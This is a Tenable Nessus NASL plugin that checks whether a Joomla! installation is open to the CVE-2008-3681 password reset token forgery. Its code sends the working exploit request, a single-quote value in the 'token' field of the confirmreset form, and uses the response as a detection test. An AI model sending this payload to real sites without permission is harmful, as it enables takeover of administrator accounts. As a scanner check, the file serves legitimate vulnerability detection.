#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33882);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2008-3681");
  script_bugtraq_id(30667);
  script_osvdb_id(47476);
  script_xref(name:"EDB-ID", value:"6234");
  script_xref(name:"Secunia", value:"31457");

  script_name(english:"Joomla! reset.php Reset Token Validation Forgery");
  script_summary(english:"Attempts to reset a password using an invalid token.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
a vulnerability in its password reset mechanism.");
  script_set_attribute(attribute:"description", value:
"The version of Joomla! running on the remote host is affected by a
password reset vulnerability in components/com_user/models/reset.php
script due to improper validation of user-supplied input to the
'token' parameter before using it to construct database queries in the
confirmReset() function. An unauthenticated, remote attacker can
exploit this issue by entering a single quote character when prompted
for a token in the 'Forgot your Password' form, thereby causing a
reset of the password of the first enabled user, typically an
administrator.");
  # https://developer.joomla.org/security/news/241-20080801-core-password-remind-functionality.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e6dcfebf");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! 1.5.6 or later. Alternatively, patch the
components/com_user/models/reset.php script, as referenced in the
vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/08/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/08/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/08/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Make sure the form exists.
r = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/index.php?option=com_user&view=reset&layout=confirm",
  exit_on_fail : TRUE
);

# If it does...
if (
  "confirmreset" >< r[2] &&
  'input id="token"' >< r[2]
)
{
  # Determine the hidden variable.
  hidden = NULL;

  pat = 'type="hidden" name="([0-9a-fA-F]+)" value="1"';
  matches = egrep(pattern:pat, string:r[2]);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!empty_or_null(item))
      {
        hidden = item[1];
        break;
      }
    }
  }

  # Try the exploit.
  # this doesn't actually reset the password, only verifies
  # that the token has been confirmed.
  if (empty_or_null(hidden))
    exit(0, "Nessus could not find the hidden form variable on the "+app+" install at "+install_url);
  else
  {
    postdata = "token='&" +hidden+ "=1";
    url = "/index.php?option=com_user&task=confirmreset";

    r = http_send_recv3(
      method  : "POST",
      item    : dir + url,
      version : 11,
      port    : port,
      add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"),
      data    : postdata,
      exit_on_fail : TRUE
    );

    # There's a problem if we're redirected to the confirmation screen.
    if ("option=com_user&view=reset&layout=complete" >< r[2])
    {
      output = strstr(r[2], "option=com_user");
      if(empty_or_null(output)) output = r[2];

      security_report_v4(
        port        : port,
        severity    : SECURITY_HOLE,
        generic     : TRUE,
        request     : make_list(http_last_sent_request()),
        output      : output
      );
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
